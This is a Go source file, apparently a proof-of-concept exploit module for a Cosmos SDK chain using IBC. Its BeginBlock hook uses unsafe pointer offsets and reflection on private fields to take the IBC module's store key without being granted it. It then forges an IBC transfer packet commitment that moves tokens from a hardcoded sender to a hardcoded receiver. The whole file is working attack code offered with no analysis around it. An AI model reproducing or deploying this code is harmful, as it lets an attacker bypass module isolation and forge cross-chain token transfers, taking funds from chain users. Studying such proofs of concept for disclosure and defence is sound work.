package capabilities_exploit

import (
	"reflect"
	"time"
	"unsafe"

	abci "github.com/tendermint/tendermint/abci/types"

	"github.com/cosmos/cosmos-sdk/codec"
	sdk "github.com/cosmos/cosmos-sdk/types"

	"github.com/cosmos/cosmos-sdk/store/cachemulti"
	storetypes "github.com/cosmos/cosmos-sdk/store/types"
	transfertypes "github.com/cosmos/ibc-go/v3/modules/apps/transfer/types"
	clienttypes "github.com/cosmos/ibc-go/v3/modules/core/02-client/types"
	channelkeeper "github.com/cosmos/ibc-go/v3/modules/core/04-channel/keeper"
	channeltypes "github.com/cosmos/ibc-go/v3/modules/core/04-channel/types"
	ibchost "github.com/cosmos/ibc-go/v3/modules/core/24-host"
)

type AppModule struct {
	cdc codec.Codec
}

func (am AppModule) BeginBlock(ctx sdk.Context, _ abci.RequestBeginBlock) {
	// wait for transfer channel to be open
	if ctx.BlockHeader().Height < 30 {
		return
	}

	var ibcStoreKey storetypes.StoreKey
	ptrToCtx := unsafe.Pointer(&ctx)
	ptrToMultiStore := unsafe.Pointer(uintptr(ptrToCtx) + uintptr(16))
	multiStore := (*storetypes.MultiStore)(ptrToMultiStore)
	if multiStore != nil {
		cacheMultiStore := (*multiStore).(cachemulti.Store)
		cacheMultiStoreReflect := reflect.ValueOf(cacheMultiStore)
		keysFieldReflect := cacheMultiStoreReflect.FieldByName("keys")

		if keysFieldReflect.Kind() == reflect.Map {
			for _, e := range keysFieldReflect.MapKeys() {
				val := keysFieldReflect.MapIndex(e)
				if val.Kind() == reflect.Interface {
					ptrToVal := unsafe.Pointer(&val)
					ptrToKey := unsafe.Pointer(uintptr(ptrToVal) + uintptr(8))
					ptr := (*unsafe.Pointer)(ptrToKey)
					theKey := (*storetypes.StoreKey)(*ptr)
					if (*theKey).Name() == ibchost.StoreKey {
						ibcStoreKey = *theKey
						break
					}
				}
			}
		}

		if ibcStoreKey != nil {
			sendPacket(ctx, ibcStoreKey, am.cdc)
		}
	}
}

func sendPacket(ctx sdk.Context, ibcStoreKey storetypes.StoreKey, cdc codec.BinaryCodec) {
	ibcStore := ctx.KVStore(ibcStoreKey)

	timeoutHeight := clienttypes.ZeroHeight()
	transferTimeoutPeriod := time.Duration(time.Second * 3600)
	timeoutTimestamp := uint64(ctx.BlockTime().Add(transferTimeoutPeriod).UnixNano())
	sourcePort := transfertypes.PortID
	sourceChannel := "channel-1"
	senderAddress := "stride1xh7jp7gtey95yz97w7djdm59tz0ctjrzmrc5qf"
	receiverAddress := "cosmos1jcv4608cflgjz9m9tdmnf32n9j9fxctczyg55y"
	token := sdk.NewCoin("stake", sdk.NewInt(3))

	bz := ibcStore.Get(ibchost.ChannelKey(sourcePort, sourceChannel))
	if bz == nil {
		return
	}
	var channel channeltypes.Channel
	cdc.MustUnmarshal(bz, &channel)

	bz = ibcStore.Get(ibchost.NextSequenceSendKey(sourcePort, sourceChannel))
	if bz == nil {
		return
	}
	sequence := sdk.BigEndianToUint64(bz)

	packetData := transfertypes.NewFungibleTokenPacketData(
		token.Denom, token.Amount.String(), senderAddress, receiverAddress,
	)

	packet := channeltypes.NewPacket(
		packetData.GetBytes(),
		sequence,
		sourcePort,
		sourceChannel,
		channel.Counterparty.PortId,
		channel.Counterparty.ChannelId,
		timeoutHeight,
		timeoutTimestamp,
	)

	commitment := channeltypes.CommitPacket(cdc, packet)

	ibcStore.Set(ibchost.NextSequenceSendKey(packet.GetSourcePort(), packet.GetSourceChannel()), sdk.Uint64ToBigEndian(sequence+1))
	ibcStore.Set(ibchost.PacketCommitmentKey(packet.GetSourcePort(), packet.GetSourceChannel(), packet.GetSequence()), commitment)
	channelkeeper.EmitSendPacketEvent(ctx, packet, channel, timeoutHeight)
}
